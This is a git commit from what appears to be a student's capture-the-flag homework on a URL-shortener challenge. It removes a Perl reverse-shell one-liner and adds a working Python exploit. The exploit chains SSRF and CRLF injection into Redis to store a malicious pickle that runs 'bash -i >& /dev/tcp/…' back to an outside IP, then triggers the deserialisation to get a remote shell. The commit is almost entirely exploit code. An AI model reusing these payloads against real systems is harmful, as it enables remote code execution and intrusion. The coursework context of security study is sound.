5a94a6004920bbb4dd541073d395eef0c9ec9e15
Alfons0329 <alfons.cs04@g2.nctu.edu.tw>
2019-11-30 03:09:56 +0800

    AC Tinyurl, writeup tomorrow

--- Hw0x06/tinyurl/shell.perl
+++
@@ -1,1 +0,0 @@
-use Socket;$i="127.0.0.1";$p=10163;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
--- Hw0x06/tinyurl/solve.py
+++ Hw0x06/tinyurl/solve.py
@@ -2,50 +2,15 @@
 import urllib, requests, socket
 import os
 import pickle, redis
-
 #-------------OK---------------#
-url_post = 'http://redis:6379/?q=HTTP/1.1%0D%0ASET "session:8b84b3c7-34eb-4fcf-ab79-3ae9e44f52ee" "\x80\x03cposix\nsystem\nq\x00X5\x00\x00\x00"%0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'
+# send payload
+url_post = 'http://redis:6379/?q=HTTP/1.1%0D%0ASET "session:e05097b2-fece-466f-b1be-a49909eda558" "\x80\x03cposix\nsystem\nq\x00X5\x00\x00\x00bash -c \'bash -i >%26 /dev/tcp/140.112.90.24/9527 0>%261\'q\x01\x85q\x02Rq\x03."%0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'
 
-print(url_post)
-r = requests.post('https://localhost:10163', data={'url': url_post}, verify=False)
+r = requests.post('https://edu-ctf.csie.org:10163', data={'url': url_post}, verify=False)
 print(r.status_code, r.text)
-requests.get(r.text, verify=False)
 
-#-------------OK---------------#
-url_post = 'http://redis:6379/?q=HTTP/1.1%0D%0AAPPEND "session:8b84b3c7-34eb-4fcf-ab79-3ae9e44f52ee" "bash -c"%0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'
+# make payload to db
+r2 = requests.get(r.text, verify=False)
+print(r2.status_code, r2.text)
 
-print(url_post)
-r = requests.post('https://localhost:10163', data={'url': url_post}, verify=False)
-print(r.status_code, r.text)
-requests.get(r.text, verify=False)
-#-------------OK---------------#
-url_post = 'http://redis:6379/?q=HTTP/1.1%0D%0AAPPEND "session:8b84b3c7-34eb-4fcf-ab79-3ae9e44f52ee" " 'bash -i"%0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'
-
-print(url_post)
-r = requests.post('https://localhost:10163', data={'url': url_post}, verify=False)
-print(r.status_code, r.text)
-requests.get(r.text, verify=False)
-#-------------OK---------------#
-url_post = 'http://redis:6379/?q=HTTP/1.1%0D%0AAPPEND "session:8b84b3c7-34eb-4fcf-ab79-3ae9e44f52ee" " >"%0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'
-
-print(url_post)
-r = requests.post('https://localhost:10163', data={'url': url_post}, verify=False)
-print(r.status_code, r.text)
-requests.get(r.text, verify=False)
-#-------------OK---------------#
-url_post = 'http://redis:6379/?q=HTTP/1.1%0D%0AAPPEND "session:8b84b3c7-34eb-4fcf-ab79-3ae9e44f52ee" "%26/dev/tcp/140.112.90.24/9527" %0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'
-
-print(url_post)
-r = requests.post('https://localhost:10163', data={'url': url_post}, verify=False)
-print(r.status_code, r.text)
-requests.get(r.text, verify=False)
-#-------------OK---------------#
-url_post = 'http://redis:6379/?q=HTTP/1.1%0D%0AAPPEND "session:8b84b3c7-34eb-4fcf-ab79-3ae9e44f52ee" "0>%261\'q\x01\x85q\x02Rq\x03." %0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'
-
-print(url_post)
-r = requests.post('https://localhost:10163', data={'url': url_post}, verify=False)
-print(r.status_code, r.text)
-requests.get(r.text, verify=False)
-# url_post = 'http://redis:6379/?q=HTTP/1.1%0D%0ASET "session:1726804f-bcf3-4101-9d2b-22365652097d" "\x80\x03cposix\nsystem\nq\x00X5\x00\x00\x00bash -c \'bash -i >& /dev/tcp/140.112.90.24/9527 0>&1\'q\x01\x85q\x02Rq\x03."%0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'
-
-# url_post = 'http://redis:6379/?q=HTTP/1.1%0D%0ASET "session:057a0c8f-f743-4b1b-88ef-838e76c07408" GGGGGGGGGGGGGGGG%0D%0AHeader2: THIS_IS_MY_HEADER_2%0D%0A'
+print('visit [%s] in broewer with session ID [%s] for reverse shell' % (r.text, "session:e05097b2-fece-466f-b1be-a49909eda558"))
